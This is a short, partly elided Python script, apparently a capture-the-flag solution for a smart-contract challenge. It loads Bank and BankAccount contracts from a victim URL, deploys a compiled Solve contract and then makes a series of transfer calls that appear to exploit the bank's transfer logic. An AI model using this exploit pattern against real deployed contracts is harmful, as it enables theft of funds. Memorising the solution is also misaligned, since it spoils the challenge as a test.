...
Bank = w3.eth.contract(
    abi=requests.get((f"{VICTIM_URL}/bank_abi.json")).json(),
    address=requests.get((f"{VICTIM_URL}/bank_transaction_receipt.json")).json()[
        "contractAddress"
    ],
)

BankAccount = w3.eth.contract(
    abi=requests.get((f"{VICTIM_URL}/bank_account_abi.json")).json(),
    address=requests.get(
        (f"{VICTIM_URL}/bank_account_transaction_receipt.json")
...
for name, compiled in compile_files(["Solve.sol"], solc_version="0.8.9").items():
    if name.endswith("Solve"):
        ...
        transaction_receipt = transact(contract.constructor(Bank.address))
...
print(transact(Bank.functions.transfer(BankAccount.address, Solve.address, 1)))
print(transact(Bank.functions.transfer(Solve.address, BankAccount.address, 1)))
print(transact(Bank.functions.transfer(Solve.address, BankAccount.address, 1000)))
